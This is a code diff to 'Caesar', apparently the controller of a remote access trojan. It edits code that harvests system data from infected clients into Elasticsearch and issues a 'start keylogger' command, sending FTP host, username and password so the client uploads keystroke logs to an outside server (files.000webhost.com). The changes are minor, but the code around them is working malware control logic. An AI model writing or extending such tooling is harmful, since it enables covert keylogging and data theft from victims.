@@ -31,8 +31,8 @@ class Caesar:
             self.esHandler = EsHandler(db_name, es_url)
 
             ##################################FTP SERVER CREDENTIALS#############################
-            self.FTP_USER = ""
-            self.FTP_PASS = ""
+            self.FTP_USER = "FTP-USERNAME"
+            self.FTP_PASS = "FTP-PASSWORD"
             self.LOG_FILE = "log.txt"
             self.FTP_HOST = "files.000webhost.com"
             ##################################FTP SERVER CREDENTIALS#############################
@@ -170,8 +170,9 @@ class Caesar:
 
 
 
-        #saves harvested system info from client in Elastic Search Index
+        # saves harvested system info from client in Elastic Search Index
         def store_harvested_data(self, client_sock_object, client_id):
+            print("[+] Data extraction in progress...")
             data_types = [
                 ("installed-apps", "Installed App Data"),
                 ("startup-app-data", "Startup App Data"),
@@ -197,7 +198,7 @@ class Caesar:
                 print("[+] Data extraction completed!")
 
             except Exception as e:
-                print("[-]Error occurred while collecting data!!!")
+                print("[-]Error occurred while collecting data!")
                 print(e)
 
 
@@ -329,7 +330,7 @@ class Caesar:
                         print(str(data), end="")
 
                     elif cmd == "start keylogger":
-                        cmd +=  f" {self.FTP_PASS} {self.LOG_FILE} {self.clientFolder} {self.current_session_id} {self.FTP_HOST} {self.FTP_USER}"
+                        cmd +=  f" {self.LOG_FILE} {self.clientFolder} {self.current_session_id} {self.FTP_HOST} {self.FTP_USER} {self.FTP_PASS}"
                         client_sock_object.send(str(cmd).encode())
                         data = client_sock_object.recv(1024).decode()
                         print(str(data), end="")
